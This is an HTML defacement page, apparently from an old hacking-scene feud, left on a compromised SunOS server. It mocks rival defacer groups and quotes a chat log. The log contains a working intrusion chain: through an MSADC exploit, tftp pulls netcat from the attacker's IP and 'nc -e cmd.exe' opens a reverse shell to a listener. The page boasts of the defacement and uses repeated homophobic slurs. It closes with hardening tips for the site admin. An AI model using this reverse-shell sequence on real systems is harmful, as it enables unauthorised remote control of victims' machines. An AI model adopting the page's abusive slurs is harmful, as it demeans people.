enough of that onto the rant :>

<p><font color="#33CCFF">Well well well , it seems the kiddies have progressed from elite msadc echo technique to
<br>k-rad *front-page*ing.Yes i'm refering to them retards known as digital insanity (team Infinity).
<br>These kids now think they are cool because someone showed them how to frontpage and now
<br>they can deface those oh so krad redhat boxes without even getting root on them.
<br>What was even funnier about thier last demonstration of cluelessness was the attempt to
<br>write me off as an NT only defacer. If they looked back through the attrition archive they
<br>would realise this isn't the case. btw this is a SunOS box ever heard of one ? no didn't think so.
<br>Digital Insanities elite linux skillz are summed up with a simple view source on that krad
<br>HTML page they upload to weavwayne.org , you should see ...
<br>
<br>*meta name="GENERATOR" content="Microsoft FrontPage Express 2.0"*
<br>
<pre>HoHoHoHo , just what I thought nothing more than a bunch of clueless windowz kids
     who are incapable of writing a simple html file and need a html generator to do the work.
     Nice try kids but no cigar.
     Here are some logs I have of idiotism one of the fags in digital Insanity.

    [idiotism]how do you upload html files with msadc?
    [blazinweed] well since your gay defacements annoy me so much I will show you
    [blazinweed] first setup a tftp server on you're linux box put netcat.exe in the tftp dir
    [blazinweed] then run your gay msadc script and type :
    [blazinweed] cd c:\winnt && tftp -i $yourIP get nc.exe nc.exe && attrib -r nc.exe && nc -e cmd.exe $yourIP $port
    [idiotism] ?!
    [blazinweed] then on your gay fag redhat box run nc -l -n -v -p 1000 and it should connect to you on 1000.
    [idiotism] I don't have linux installed atm is there any other way
    [blazinweed] I have no more time for you kid go away , learn how to use a comp before you try breaking into one
    [idiotism] you there ?
    [snip]
<br>
    you dare fuckin accusing me of not knowing anything and not even be able to follow the simple instructions I gave you?.
    a few weeks later...

    [idiotism]hey you there?
    [blazinweed] uh ? what do you want ?
    [idiotism] you got your wish team infinity is over
    [blazinweed]great tell that to someone who cares
    [idiotism]me and weed are going to make a new group called digitalinsanity
    [blazinweed]pheer
    [idiotism]we won't be doing any more msadc defacements 
    [blazinweed] tell that to yourself
    [snip]
    <p>Let me see you carry on saying I use gfxspin to upload html.</font>

  <font color="#FFFFFF"> Now to address you kids in ph33r the b33r ( elite team name wouldn't you all say ?).
   Since I now see you associated with team faggot I now include you in the same bracket.
   Did you guys ever hear the saying "never give a loaded gun to an idiot?".
   slander me all you want on those elite .kr boxes I shall not return my point is made
   and I have nothing further to get off my chest.
   This is my last defacement because quite frankly defacing is gay and I would hope all you kids
   would realise this and stop running the scripts just to get your names on attrition and get a fuckin life.
   while it may make you look good to clueless idiots you will quickly find you have lost all respect from
   people worth having respect from.</font>
   don't get me wrong zenomorph this doesn't mean we are no longer cool your welcome in my chan anytime.

<br><font color="#FF0000">*ATTENTION ADMIN*
<br>It would seem your box was already compromise and a trinoo daemon was running. I would expect more security from america.net
<br>I'll give you quick and a dirty tips on preventing this from happening in future so here goes 
<pre>(1)
 First of all don't let code execute off the stack this is how 99% of remote exploits work , to fix it simply
 add the following lines to /etc/system and reboot it.
 set noexec_user_stack=1
 set noexec_user_stack_log =1
 This will stop it and log it respectively.

(2) Installed vendor related security patches get these for your OS from
<A HREF="http://sunsolve.sun.com/pub-cgi/show.pl?target=patches/patch-access"><FONT COLOR="#FFFFFF" CLASS="nonuw">http://sunsolve.sun.com/pub-cgi/show.pl?target=patches/patch-access</FONT></A>

     

(3) Where the hell is the firewall ?! you have far too many customers depending on you and its the least i'd expect.
    I could have owned pretty much all of your internal networks and done far more damage by setting up a sniffer.</font></pre>

<br>Well I bid you all farewell but before I go I would very much like to show off my desktop which I have been working on

<br> 
<br> To the fags in team infinity , you keep pasting your moronic diatribe on noname webpages. People will now be able to see you for the 
<br> worthless peices of shit you truly are not that it wasn't aparent to begin with. You guys are so dumb you need ph33r the b33r
<br> to teach you how to type ./$script I rest my case.
